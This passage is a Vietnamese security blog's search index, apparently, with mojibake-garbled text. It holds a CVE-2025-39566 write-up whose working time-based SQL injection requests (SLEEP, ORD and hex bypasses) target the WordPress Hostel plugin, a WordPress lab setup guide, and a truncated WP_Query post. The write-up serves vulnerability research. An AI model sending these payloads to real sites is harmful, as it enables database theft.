ƒë·ªùi khi WordPress d·ª±ng Admin Dashboard Menu. Menu tr√™n UI Admin Dashboard\nDebugging\nCh·ª©c nƒÉng b·ªã l·ªói n·∫±m trong Booking Manager, v√¨ v·∫≠y ta truy c·∫≠p v√†o submenu Manager Bookings tr√™n UI Admin Dashboard. Ngay tr∆∞·ªõc nh√°nh default c√≥ comment // list bookings =\u0026gt; cho th·∫•y ƒëo·∫°n code n√†y x·ª≠ l√Ω vi·ªác li·ªát k√™ v√† s·∫Øp x·∫øp bookings M·ªü debugger: Click Run with Debugger. ƒê·∫∑t breakpoint t·∫°i nh√°nh switch ch·ª©a code l·ªói v√† t·∫°i d√≤ng code g√¢y l·ªói. Khi click v√†o m·ªôt c·ªôt trong b·∫£ng bookings, quan s√°t: Debugger nh·∫£y v√†o c·∫•u tr√∫c switch. D√πng Step Over, debugger ƒëi ti·∫øp v√†o nh√°nh default. Ti·∫øp t·ª•c Step Over v√† theo d√µi gi√° tr·ªã bi·∫øn trong tab Variables \u0026gt; Locals. C√°c bi·∫øn n√†y s·∫Ω k·∫øt h·ª£p ƒë·ªÉ t·∫°o th√†nh c√¢u SQL b√™n d∆∞·ªõi. Sau khi gh√©p c√°c bi·∫øn, c√¢u query ƒë·∫ßy ƒë·ªß c√≥ d·∫°ng:\nSELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM wp_hostel_bookings tB JOIN wp_hostel_rooms tR ON tR.id = tB.room_id WHERE is_static=0 AND tB.id = ... ORDER BY tB.amount_paid ASC|DESC LIMIT ... ƒê√°ng ch√∫ √Ω, bi·∫øn $orderby ƒë∆∞·ª£c g√°n nh∆∞ sau:\nif(!empty($_GET[\u0026#39;ob\u0026#39;])) {\t$orderby = \u0026#34;ORDER BY \u0026#34;.sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]) . \u0026#39; \u0026#39; . $dir; } ‚ö†Ô∏è ·ªû ƒë√¢y c√≥ ƒëi·ªÉm b·∫•t th∆∞·ªùng:\nPh·∫ßn sau ORDER BY s·ª≠ d·ª•ng sanitize_text_field(). H√†m n√†y ch·ªâ l√†m s·∫°ch HTML, kh√¥ng h·ªÅ filter ho·∫∑c validate ƒë·ªÉ ƒë·∫£m b·∫£o an to√†n trong SQL context. Tham s·ªë ob (do ng∆∞·ªùi d√πng truy·ªÅn v√†o) v√¨ v·∫≠y c√≥ th·ªÉ b·ªã l·ª£i d·ª•ng ƒë·ªÉ ch√®n tr·ª±c ti·∫øp v√†o c√¢u SQL. Exploit Detect SQLi Request with BurpSuite:\nGET /wp-admin/admin.php?page=wphostel_bookings\u0026amp;type=upcoming\u0026amp;ob=tB.status,(SELECT+SLEEP(10))\u0026amp;dir=ASC HTTP/1.1 Ta t√°ch m·ªánh ƒë·ªÅ ORDER BY b·∫±ng , v√¨ n√≥ ch·∫•p nh·∫≠p multi column\nK·∫øt qu·∫£: th·ªùi gian ph·∫£n h·ªìi b·ªã delay =\u0026gt; SQL Injection th√†nh c√¥ng.\nDump Data from Database Bypass ' using ORD():\nƒê·ªÉ dump d·ªØ li·ªáu c·ªßa database ta c·∫ßn th·ª≠ ƒë·ªÉ l·∫•y k√Ω t·ª± ƒë·∫ßu ti√™n c·ªßa database name.\nDo sanitize_text_field() lo·∫°i b·ªè ', ta kh√¥ng d√πng ƒë∆∞·ª£c payload so s√°nh tr·ª±c ti·∫øp. Thay v√†o ƒë√≥ d√πng ORD() ƒë·ªÉ so s√°nh k√Ω t·ª± theo ASCII:\nGET /wp-admin/admin.php?page=wphostel_bookings\u0026amp;type=past\u0026amp;ob=tB.status,(SELECT+IF(ORD(SUBSTRING(DATABASE(),1,1))=119,SLEEP(5),0))\u0026amp;dir=ASC HTTP/1.1 Th√†nh c√¥ng bypass =\u0026gt; c√≥ th·ªÉ tr√≠ch xu·∫•t t√™n database.\nBypass ' using Hex encoding (extend)\nNgo√†i ORD() ta c√≥ th·ªÉ s·ª≠ d·ª•ng Hex encoding ƒë·ªÉ bypass\nGET /wp-admin/admin.php?page=wphostel_bookings\u0026amp;type=past\u0026amp;ob=tB.status,(SELECT+IF(SUBSTRING(DATABASE(),1,1)=0x77,SLEEP(5),0))\u0026amp;dir=ASC HTTP/1.1 Th√†nh c√¥ng bypass =\u0026gt; c√≥ th·ªÉ tr√≠ch xu·∫•t t√™n database.\nConclusion L·ªó h·ªïng CVE-2025-39566 trong plugin WordPress Hostel tr∆∞·ªõc phi√™n b·∫£n 1.1.5.7, xu·∫•t ph√°t t·ª´ vi·ªác truy·ªÅn tr·ª±c ti·∫øp input t·ª´ ng∆∞·ªùi d√πng v√†o SQL query m√† kh√¥ng c√≥ bi·ªán ph√°p ki·ªÉm so√°t ch·∫∑t ch·∫Ω d·∫´n ƒë·∫øn l·ªó h·ªïng SQL Injection.\nKey takeaways:\nsanitize_text_field() ‚â† ch·ªëng SQL Injection C·∫ßn ph√¢n bi·ªát r√µ: l·ªçc input cho HTML vs cho SQL References SQL Injection Cheat Sheet ‚Äì PortSwigger\nWordPress Hostel Plugin \u0026lt;= 1.1.5.6 is vulnerable to SQL Injection - patchstack\n","permalink":"//localhost:1313/vi/posts/2025-09-21-cve-2025-39566/","summary":"\u003cp\u003eL·ªó h·ªïng trong plugin \u003cstrong\u003eHostel\u003c/strong\u003e tr∆∞·ªõc phi√™n b·∫£n \u003cstrong\u003e1.1.5.7\u003c/strong\u003e. Do vi·ªác l√†m s·∫°ch d·ªØ li·ªáu kh√¥ng ƒë√∫ng c√°ch, ƒëi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng tr·ª±c ti·∫øp t∆∞∆°ng t√°c v·ªõi c∆° s·ªü d·ªØ li·ªáu, bao g·ªìm kh√¥ng gi·ªõi h·∫°n ·ªü vi·ªác ƒë√°nh c·∫Øp th√¥ng tin.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eCVE ID\u003c/strong\u003e: \u003ca href=\"https://www.cve.org/CVERecord?id=CVE-2025-39566\"\u003eCVE-2025-39566\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eProduct\u003c/strong\u003e: \u003ca href=\"https://wordpress.org/plugins/hostel/\"\u003eWordPress Hostel Plugin\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVulnerability Type\u003c/strong\u003e: SQL Injection\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAffected Versions\u003c/strong\u003e: \u0026lt;= 1.1.5.6\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCVSS severity\u003c/strong\u003e: 7.6 (High)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eRequired Privilege\u003c/strong\u003e: Administrator\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"requirements\"\u003eRequirements\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://w41bu1.github.io/blog/posts/2025-09-20-wordpress-local-and-debugging/\"\u003e\u003cstrong\u003eLocal WordPress and Debugging\u003c/strong\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eHostel Plugin\u003c/strong\u003e:  v1.1.5.6(vul) v√† v1.1.5.7(fix)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ediff tool\u003c/strong\u003e: \u003cstrong\u003emeld\u003c/strong\u003e ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th√°y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"analysis\"\u003eAnalysis\u003c/h2\u003e\n\u003cp\u003eNguy√™n nh√¢n c·ªë l√µi do ·ª©ng d·ª•ng ch√®n tr·ª±c ti·∫øp d·ªØ li·ªáu t·ª´ \u003cstrong\u003eGET\u003c/strong\u003e request v√†o SQL query m√† c∆° ch·∫ø ki·ªÉm so√°t kh√¥ng ch·∫∑t ch·∫Ω.\u003c/p\u003e","title":"CVE-2025-39566 Analysis \u0026 POC"},{"content":"WordPress l√† m·ªôt h·ªá th·ªëng qu·∫£n l√Ω n·ªôi dung (CMS) m·∫°nh m·∫Ω v√† ph·ªï bi·∫øn nh·∫•t cho ph√©p b·∫°n t·∫°o, qu·∫£n l√Ω v√† t√πy ch·ªânh c√°c trang web v√† blog m·ªôt c√°ch d·ªÖ d√†ng. N√≥ l√† open-source CMS, ƒë∆∞·ª£c x√¢y d·ª±ng tr√™n PHP v√† s·ª≠ d·ª•ng c∆° s·ªü d·ªØ li·ªáu MySQL ho·∫∑c Maria DB.\nRa ƒë·ªùi nƒÉm 2003, ban ƒë·∫ßu ch·ªâ ƒë·ªÉ vi·∫øt blog, sau ƒë√≥ ph√°t tri·ªÉn th√†nh n·ªÅn t·∫£ng t·∫°o website, c·ª≠a h√†ng online, di·ªÖn ƒë√†n, landing page‚Ä¶ Hi·ªán nay, h∆°n 40% website tr√™n th·∫ø gi·ªõi ch·∫°y b·∫±ng WordPress. C√≥ 2 phi√™n b·∫£n WordPress:\nWordPress.com D·ªãch v·ª• hosting do Automattic cung c·∫•p B·∫°n ch·ªâ c·∫ßn ƒëƒÉng k√Ω t√†i kho·∫£n, kh√¥ng ph·∫£i c√†i ƒë·∫∑t H·∫°n ch·∫ø t√πy ch·ªânh, mu·ªën n√¢ng cao th√¨ ph·∫£i tr·∫£ ph√≠ WordPress.org M√£ ngu·ªìn m·ªü, b·∫°n t·ª± t·∫£i v·ªÅ v√† c√†i ƒë·∫∑t l√™n hosting/server ri√™ng T√πy ch·ªânh to√†n di·ªán, c√≥ th·ªÉ c√†i plugin, theme, vi·∫øt code, t·∫°o website theo √Ω m√¨nh Ecosystem Core: CMS ch√≠nh Plugin: M·ªôt ph·∫ßn m·ªÅm b·ªï sung c√≥ th·ªÉ ƒë∆∞·ª£c c√†i ƒë·∫∑t tr√™n trang web WordPress ƒë·ªÉ m·ªü r·ªông ch·ª©c nƒÉng c·ªßa n√≥ v√† th√™m c√°c t√≠nh nƒÉng m·ªõi Themes: M·ªôt ph·∫ßn m·ªÅm b·ªï sung ƒë·∫°i di·ªán cho s·ª± xu·∫•t hi·ªán tr·ª±c quan v√† b·ªë c·ª•c c·ªßa m·ªôt trang web WordPress Why WordPress Hacking? State of WordPress Security in 2024\nMost Popular Hi·ªán t·∫°i h∆°n 40% website tr√™n to√†n th·∫ø gi·ªõi ch·∫°y WordPress Nghƒ©a l√† hacker ch·ªâ c·∫ßn t√¨m ra m·ªôt l·ªó h·ªïng ph·ªï bi·∫øn =\u0026gt; c√≥ th·ªÉ khai th√°c h√†ng tri·ªáu site c√πng l√∫c Gi·ªëng nh∆∞ ‚Äúc√° nhi·ªÅu th√¨ ch√†i ·ªü ƒë√≥‚Äù Plugin and Theme WordPress Core ƒë√£ ƒë∆∞·ª£c xem x√©t trong 1 th·ªùi gian d√†i b·ªüi h√†ng ng√†n developers v√† researchers. K·∫øt qu·∫£ l√† r·∫•t kh√≥ ƒë·ªÉ k·∫ª t·∫•n c√¥ng c√≥ th·ªÉ ƒë·ªôt nh·∫≠p v√†o Tuy nhi√™n, c√≥ h√†ng ch·ª•c ng√†n plugin v√† theme t·ª´ nhi·ªÅu ngu·ªìn, ch·∫•t l∆∞·ª£ng kh√¥ng ƒë·ªìng ƒë·ªÅu ƒë∆∞·ª£c s·ª≠ d·ª•ng Nhi·ªÅu plugin code b·∫£o m·∫≠t k√©m, kh√¥ng c√≤n ƒë∆∞·ª£c c·∫≠p nh·∫≠t. Hacker ch·ªâ c·∫ßn scan plugin/theme ƒë·ªÉ t√¨m version l·ªói th·ªùi, r·ªìi khai th√°c Setup WordPress for Hacking C√≥ r·∫•t nhi·ªÅu c√°ch ƒë·ªÉ setup WorkPress, t√¨m ki·∫øm b·∫±ng Google c√≥ th·ªÉ cung c·∫•p nhi·ªÅu b√†i vi·∫øt v·ªÅ n√≥. ·ªû ƒë√¢y t√¥i s·∫Ω setup tr√™n m√°y ·∫£o Ubuntu (22.04):\nKh√¥ng ·∫£nh h∆∞·ªüng ƒë·∫øn c√°c d·ªãch v·ª• c·ªßa m√°y th·∫≠t WordPress t∆∞∆°ng ƒë·ªëi nh·∫π ƒë·ªÉ s·ª≠ d·ª•ng tr√™n m√°y ·∫£o Install and configure WordPress Install Dependencies C√†i to√†n b·ªô stack c·∫ßn thi·∫øt ƒë·ªÉ ch·∫°y WordPress (web server + database + PHP + c√°c extension quan tr·ªçng).\nsudo apt install apache2 \\ ghostscript \\ libapache2-mod-php \\ mysql-server \\ php \\ php-bcmath \\ php-curl \\ php-imagick \\ php-intl \\ php-json \\ php-mbstring \\ php-mysql \\ php-xml \\ php-zip Install WordPress T·∫£i v√† c√†i m√£ ngu·ªìn WordPress v√†o th∆∞ m·ª•c web.\n# T·∫°o folder ƒë·ªÉ l∆∞u tr·ªØ m√£ ngu·ªìn website sudo mkdir -p /srv/www # ƒê·ªïi owner th√†nh www-data, ƒë√¢y l√† user m·∫∑c ƒë·ªãnh c·ªßa Apache/Nginx ƒë·ªÉ ch·∫°y web server # Khi Apache/NGINX kh·ªüi ƒë·ªông, n√≥ kh√¥ng ch·∫°y b·∫±ng root (nguy hi·ªÉm v√¨ c√≥ to√†n quy·ªÅn h·ªá th·ªëng), m√† s·∫Ω drop xu·ªëng ch·∫°y d∆∞·ªõi quy·ªÅn www-data. sudo chown www-data: /srv/www # T·∫£i g√≥i WordPress m·ªõi nh·∫•t t·ª´ trang ch√≠nh th·ª©c # Gi·∫£i n√©n vao th∆∞c m·ª•c /srv/www ƒë∆∞·ª£c t·∫°o ·ªü tr√™n curl https://wordpress.org/latest.tar.gz | sudo -u www-data tar zx -C /srv/www C√≥ th·ªÉ t·∫£i phi√™n b·∫£n c·ª• th·ªÉ b·∫±ng:\ncurl https://wordpress.org/wordpress-6.6.2.tar.gz | sudo -u www-data tar zx -C /srv/www C√†i t·ª´ wordpress.org l√† c√°ch chu·∫©n nh·∫•t v√† √≠t r·ªßi ro:\nUbuntu c√≥ s·∫µn package wordpress trong repo. Nh∆∞ng n√≥ th∆∞·ªùng c≈© h∆°n nhi·ªÅu so v·ªõi b·∫£n ch√≠nh th·ª©c tr√™n wordpress.org C·ªông ƒë·ªìng WordPress ch·ªâ h·ªó tr·ª£ khi b·∫°n d√πng b·∫£n ch√≠nh th·ª©c t·ª´ wordpress.org, v√¨ n·∫øu b·∫°n g·∫∑p l·ªói do package c·ªßa Ubuntu th√¨ h·ªç kh√¥ng gi·∫£i quy·∫øt ƒë∆∞·ª£c. Configure Apache for WordPress T·∫°o file /etc/apache2/sites-available/wordpress.conf c·∫•u h√¨nh Apache cho WordPress:\n# L·∫Øng nghe tr√™n t·∫•t c·∫£ ƒë·ªãa ch·ªâ IP (*) t·∫°i port 80 (HTTP). \u0026lt;VirtualHost *:80\u0026gt; # Th∆∞ m·ª•c g·ªëc c·ªßa website (n∆°i ch·ª©a m√£ ngu·ªìn WordPress). DocumentRoot /srv/www/wordpress \u0026lt;Directory /srv/www/wordpress\u0026gt; Options FollowSymLinks # Cho ph√©p file .htaccess ghi ƒë√® m·ªôt s·ªë thi·∫øt l·∫≠p li√™n quan ƒë·∫øn b·∫£o m·∫≠t v√† URL rewriting. AllowOverride Limit Options FileInfo # Khi truy c·∫≠p th∆∞ m·ª•c, Apache s·∫Ω t√¨m file index.php ƒë·ªÉ hi·ªÉn th·ªã. DirectoryIndex index.php # Cho ph√©p t·∫•t c·∫£ m·ªçi ng∆∞·ªùi truy c·∫≠p (c·∫ßn cho website public). Require all granted \u0026lt;/Directory\u0026gt; # Ri√™ng th∆∞ m·ª•c wp-content (ch·ª©a plugin, theme, upload) c≈©ng cho ph√©p truy c·∫≠p. \u0026lt;Directory /srv/www/wordpress/wp-content\u0026gt; Options FollowSymLinks Require all granted \u0026lt;/Directory\u0026gt; \u0026lt;/VirtualHost\u0026gt; K√≠ch ho·∫°t site WordPress:\nsudo a2ensite wordpress a2ensite = enable site config (t·∫°o symlink t·ª´ /etc/apache2/sites-available/wordpress.conf sang /etc/apache2/sites-enabled/) Sau ƒë√≥ site wordpress s·∫Ω ƒë∆∞·ª£c Apache load khi restart. K√≠ch ho·∫°t module rewrite:\nsudo a2enmod rewrite WordPress c·∫ßn module mod_rewrite ƒë·ªÉ h·ªó tr·ª£ Pretty Permalinks (v√≠ d·ª• /blog/hello-world/ thay v√¨ ?p=123) V√¥ hi·ªáu h√≥a site m·∫∑c ƒë·ªãnh (Option):\nsudo a2dissite 000-default Apache m·∫∑c ƒë·ªãnh c√≥ site 000-default.conf (ch·ªâ hi·ªÉn th·ªã \u0026ldquo;It works!\u0026rdquo;) N·∫øu kh√¥ng disable, site m·∫∑c ƒë·ªãnh c√≥ th·ªÉ chi·∫øm port 80 tr∆∞·ªõc WordPress üëâ Ho·∫∑c n·∫øu kh√¥ng mu·ªën disable, c√≥ th·ªÉ th√™m ServerName v√†o VirtualHost WordPress ƒë·ªÉ Apache ph√¢n bi·ªát domain.\n\u0026lt;VirtualHost *:80\u0026gt; ServerName mywordpress.local DocumentRoot /srv/www/wordpress ... \u0026lt;/VirtualHost\u0026gt; Mu·ªën ch·∫°y ƒë∆∞·ª£c th√¨ ph·∫£i c·∫•u h√¨nh DNS ho·∫∑c s·ª≠a file hosts:\nLinux/Mac: /etc/hosts Windows: C:\\Windows\\System32\\drivers\\etc\\hosts Reload Apache:\nsudo service apache2 reload T·∫£i l·∫°i c·∫•u h√¨nh m·ªõi m√† kh√¥ng c·∫ßn d·ª´ng server Configure database WordPress c·∫ßn m·ªôt c∆° s·ªü d·ªØ li·ªáu (MySQL/MariaDB) ƒë·ªÉ l∆∞u:\nB√†i vi·∫øt, trang, menu Ng∆∞·ªùi d√πng, m·∫≠t kh·∫©u (hash) C·∫•u h√¨nh site Plugins, themes settings M·ªü MySQL v·ªõi quy·ªÅn root:\nsudo mysql -u root C·∫•u h√¨nh MySQL:\n-- T·∫°o database wordpress mysql\u0026gt; CREATE DATABASE wordpress; Query OK, 1 row affected (0,00 sec) -- T·∫°o user ri√™ng cho wordpress mysql\u0026gt; CREATE USER wordpress@localhost IDENTIFIED BY \u0026#39;\u0026lt;your-password\u0026gt;\u0026#39;; Query OK, 1 row affected (0,00 sec) -- C·∫•p quy·ªÅn cho user WordPress mysql\u0026gt; GRANT SELECT,INSERT,UPDATE,DELETE,CREATE,DROP,ALTER ON wordpress.* TO wordpress@localhost; Query OK, 1 row affected (0,00 sec) -- L√†m m·ªõi l·∫°i quy·ªÅn mysql\u0026gt; FLUSH PRIVILEGES; Query OK, 1 row affected (0,00 sec) -- Tho√°t mysql\u0026gt; quit Bye Kh·ªüi ƒë·ªông l·∫°i d·ªãch v·ª•:\nsudo service mysql start Configure WordPress to connect to the database Copy file c·∫•u h√¨nh m·∫´u:\nsudo -u www-data cp /srv/www/wordpress/wp-config-sample.php /srv/www/wordpress/wp-config.php WordPress khi t·∫£i v·ªÅ c√≥ s·∫µn file wp-config-sample.php B·∫°n copy n√≥ th√†nh wp-config.php ƒë·ªÉ l√†m file c·∫•u h√¨nh ch√≠nh cho site Ch·ªânh s·ª≠a th√¥ng tin database:\nsudo -u www-data sed -i \u0026#39;s/database_name_here/wordpress/\u0026#39; /srv/www/wordpress/wp-config.php sudo -u www-data sed -i \u0026#39;s/username_here/wordpress/\u0026#39; /srv/www/wordpress/wp-config.php sudo -u www-data sed -i \u0026#39;s/password_here/\u0026lt;your-password\u0026gt;/\u0026#39; /srv/www/wordpress/wp-config.php ƒê√¢y l√† 3 d√≤ng thay th·∫ø text trong file wp-config.php: database_name_here =\u0026gt; wordpress (t√™n DB ƒë√£ t·∫°o ·ªü b∆∞·ªõc tr∆∞·ªõc) username_here =\u0026gt; wordpress (user MySQL ƒë√£ t·∫°o) password_here =\u0026gt; \u0026lt;your-password\u0026gt; (password ƒë√£ set) Khi Apache ch·∫°y WordPress, n√≥ s·∫Ω ƒë·ªçc file n√†y ƒë·ªÉ bi·∫øt d√πng user n√†o + DB n√†o ƒë·ªÉ k·∫øt n·ªëi MySQL Th√™m Secret Keys v√† Salts:\nsudo -u www-data nano /srv/www/wordpress/wp-config.php üëâ ƒê√¢y l√† chu·ªói b√≠ m·∫≠t m√† WordPress d√πng ƒë·ªÉ:\nM√£ h√≥a session cookies Sinh ra token (nonce) ch·ªëng CSRF NgƒÉn ch·∫∑n t·∫•n c√¥ng ki·ªÉu ‚Äúknown secret‚Äù (v√≠ d·ª• k·∫ª t·∫•n c√¥ng ƒëo√°n ƒë∆∞·ª£c secret m·∫∑c ƒë·ªãnh ƒë·ªÉ gi·∫£ m·∫°o login) define( \u0026#39;AUTH_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;SECURE_AUTH_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;LOGGED_IN_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;NONCE_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;AUTH_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;SECURE_AUTH_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;LOGGED_IN_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;NONCE_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); Thay ƒë·ªïi n√≥ b·∫±ng c√°c chu·ªói random sau: https://api.wordpress.org/secret-key/1.1/salt/\nConfigure WordPress Truy c·∫≠p http://localhost, ƒë·∫∑t site title, username, password, email cho user admin\nSetup Debug on VSCode ƒê·ªÉ hi·ªÉu ƒë∆∞·ª£c lu·ªìng c·ªßa trang web ch·∫°y v√† x·ª≠ l√≠ ·ªü m·ªói request, ta c·∫ßn ph·∫£i debug n√≥.\nAdd PHP Debug extension on VS Code V√†o Extensions (Ctrl+Shift+X) =\u0026gt; t√¨m PHP Debug (by Felix Becker) =\u0026gt; Install. Extension n√†y k·∫øt n·ªëi v·ªõi Xdebug.\nInstall Xdebug on Ubuntu sudo apt install php-xdebug -y Ki·ªÉm tra c√†i ch∆∞a:\nphp -v N·∫øu c√≥ d√≤ng with Xdebug v3.x.x nghƒ©a l√† ƒë√£ OK.\nConfigure Xdebug sudo nano /etc/php/\u0026lt;version\u0026gt;/apache2/php.ini Th√™m v√†o cu·ªëi file\nzend_extension=xdebug.so xdebug.mode=debug xdebug.start_with_request=yes xdebug.client_host=127.0.0.1 xdebug.client_port=9003 Port m·∫∑c ƒë·ªãnh m·ªõi c·ªßa Xdebug v3 l√† 9003.\nSau ƒë√≥ restart Apache:\nsudo systemctl restart apache2 Configure VSCode launch.json M·ªü th∆∞ m·ª•c ch·ª©a trang web wordpress b·∫±ng VSCode\ncode /srv/www/wordpress Trong VS Code =\u0026gt; Run and Debug (Ctrl+Shift+D) =\u0026gt; t·∫°o file launch.json v·ªõi n·ªôi dung:\n{ \u0026#34;version\u0026#34;: \u0026#34;0.2.0\u0026#34;, \u0026#34;configurations\u0026#34;: [ { \u0026#34;name\u0026#34;: \u0026#34;Listen for Xdebug\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;php\u0026#34;, \u0026#34;request\u0026#34;: \u0026#34;launch\u0026#34;, \u0026#34;port\u0026#34;: 9003, \u0026#34;pathMappings\u0026#34;: { \u0026#34;/srv/www/wordpress\u0026#34;: \u0026#34;${workspaceFolder}\u0026#34; } } ] } pathMappings: √°nh x·∫° th∆∞ m·ª•c trong container/server (/srv/www/wordpress) v·ªÅ th∆∞ m·ª•c local c·ªßa trong VS Code.\nNh∆∞ v·∫≠y l√† ƒë√£ ho√†n th√†nh setup WordPress tr√™n local k·∫øt h·ª£p Debug n√≥ tr√™n VSCode.\nExtend Required Version M·ªói phi√™n b·∫£n WordPress th∆∞·ªùng ƒëi k√®m 1 phi√™n b·∫£n PHP th√≠ch h·ª£p. N√™n ki·ªÉm tra t√≠nh t∆∞∆°ng th√≠ch n√†y ƒë·ªÉ qu√° tr√¨nh setup kh√¥ng b·ªã l·ªói.\nWordPress Auto Update T·ª´ WordPress 3.7 tr·ªü ƒëi (2013), WordPress c√≥ c∆° ch·∫ø t·ª± ƒë·ªông c·∫≠p nh·∫≠t (automatic background updates) cho:\nB·∫£n v√° b·∫£o m·∫≠t (security release). B·∫£n b·∫£o tr√¨ (maintenance release). Kh√¥ng t·ª± ƒë·ªông update major version (tr·ª´ khi b·∫≠t r√µ r√†ng). H·ªá th·ªëng ki·ªÉm tra v·ªõi server api.wordpress.org ƒë·ªÉ xem c√≥ b·∫£n v√° n√†o m·ªõi s·∫Ω t·ª± ƒë·ªông n√¢ng c·∫•p background l√™n. Vi·ªác n√†y di·ªÖn ra r·∫•t nhanh sau khi setup, n√™n b·∫°n th·∫•y code ƒë·ªïi kh√°c so v·ªõi source g·ªëc.\nQu√° tr√¨nh setup di·ªÖn ra khi truy c·∫≠p /wp-admin/install.php\nƒê·ªÉ v√¥ hi·ªáu h√≥a c∆° ch·∫ø c·∫≠p nh·∫≠t t·ª± ƒë·ªông n√†y, th√™m d√≤ng sau v√†o wp-config.php:\ndefine( \u0026#39;WP_AUTO_UPDATE_CORE\u0026#39;, false ); Increase Uploadable Plugin Size M·∫∑c ƒë·ªãnh, WordPress ph·ª• thu·ªôc v√†o c·∫•u h√¨nh PHP (upload_max_filesize, post_max_size, v√† ƒë√¥i khi c·∫£ max_execution_time) ƒë·ªÉ x√°c ƒë·ªãnh dung l∆∞·ª£ng file t·ªëi ƒëa c√≥ th·ªÉ upload. Tr√™n nhi·ªÅu hosting, gi·ªõi h·∫°n n√†y ch·ªâ kho·∫£ng 2MB ‚Äì 8MB, kh√¥ng ƒë·ªß cho c√°c plugin hi·ªán ƒë·∫°i.\nWhy Increase the Limit? Plugin dung l∆∞·ª£ng l·ªõn: C√°c plugin nh∆∞ WooCommerce extension, page builder, backup, ho·∫∑c security suite c√≥ th·ªÉ n·∫∑ng 20MB ‚Äì 100MB.\nTr√°nh l·ªói upload: N·∫øu file .zip l·ªõn h∆°n gi·ªõi h·∫°n, b·∫°n s·∫Ω g·∫∑p l·ªói:\n‚ÄúThe uploaded file exceeds the upload_max_filesize directive in php.ini‚Äù Ho·∫∑c upload th·∫•t b·∫°i. Thu·∫≠n ti·ªán cho qu·∫£n tr·ªã vi√™n: C√≥ th·ªÉ c√†i tr·ª±c ti·∫øp qua Dashboard m√† kh√¥ng c·∫ßn FTP/SSH.\nH·ªó tr·ª£ ph√°t tri·ªÉn plugin: Plugin t·ª± vi·∫øt k√®m nhi·ªÅu th∆∞ vi·ªán/asset c√≥ th·ªÉ kh√° n·∫∑ng, vi·ªác tƒÉng gi·ªõi h·∫°n gi√∫p test d·ªÖ d√†ng h∆°n.\nHow to Increase Plugin Upload Size S·ª≠a php.ini (n·∫øu c√≥ quy·ªÅn server):\nupload_max_filesize = 64M post_max_size = 64M max_execution_time = 300 S·ª≠a file .htaccess (n·∫øu d√πng Apache):\nphp_value upload_max_filesize 64M php_value post_max_size 64M php_value max_execution_time 300 php_value max_input_time 300 Th√™m v√†o wp-config.php:\n@ini_set( \u0026#39;upload_max_filesize\u0026#39; , \u0026#39;64M\u0026#39; ); @ini_set( \u0026#39;post_max_size\u0026#39;, \u0026#39;64M\u0026#39;); @ini_set( \u0026#39;max_execution_time\u0026#39;, \u0026#39;300\u0026#39; ); üëâ L·ªùi khuy√™n: Ch·ªâ n√™n ƒë·∫∑t gi·ªõi h·∫°n v·ª´a ƒë·ªß (64MB ho·∫∑c 128MB). Tr√°nh ƒë·∫∑t qu√° l·ªõn ƒë·ªÉ h·∫°n ch·∫ø nguy c∆° b·ªã upload file n·∫∑ng g√¢y qu√° t·∫£i server.\n","permalink":"//localhost:1313/vi/posts/2025-09-20-wordpress-local-and-debugging/","summary":"\u003cp\u003e\u003cstrong\u003eWordPress\u003c/strong\u003e l√† m·ªôt h·ªá th·ªëng qu·∫£n l√Ω n·ªôi dung (CMS) m·∫°nh m·∫Ω v√† ph·ªï bi·∫øn nh·∫•t cho ph√©p b·∫°n t·∫°o, qu·∫£n l√Ω v√† t√πy ch·ªânh c√°c trang web v√† blog m·ªôt c√°ch d·ªÖ d√†ng. N√≥ l√† open-source CMS, ƒë∆∞·ª£c x√¢y d·ª±ng tr√™n PHP v√† s·ª≠ d·ª•ng c∆° s·ªü d·ªØ li·ªáu MySQL ho·∫∑c Maria DB.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eRa ƒë·ªùi nƒÉm 2003, ban ƒë·∫ßu ch·ªâ ƒë·ªÉ vi·∫øt blog, sau ƒë√≥ ph√°t tri·ªÉn th√†nh n·ªÅn t·∫£ng t·∫°o website, c·ª≠a h√†ng online, di·ªÖn ƒë√†n, landing page‚Ä¶\u003c/li\u003e\n\u003cli\u003eHi·ªán nay, h∆°n 40% website tr√™n th·∫ø gi·ªõi ch·∫°y b·∫±ng WordPress.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eC√≥ 2 phi√™n b·∫£n WordPress:\u003c/p\u003e","title":"WordPress Local and Debugging"},{"content":"Introduction Do vi·ªác l√†m s·∫°ch d·ªØ li·ªáu (sanitization) kh√¥ng ƒë√∫ng c√°ch trong WP_Query, c√≥ nh·ªØng tr∆∞·ªùng h·ª£p c√≥ th·ªÉ x·∫£y ra SQL Injection th√¥ng qua c√°c plugin ho·∫∑c theme s·ª≠ d·ª•ng n√≥ theo m·ªôt c√°ch nh·∫•t ƒë·ªãnh. L·ªó h·ªïng n√†y ƒë√£ 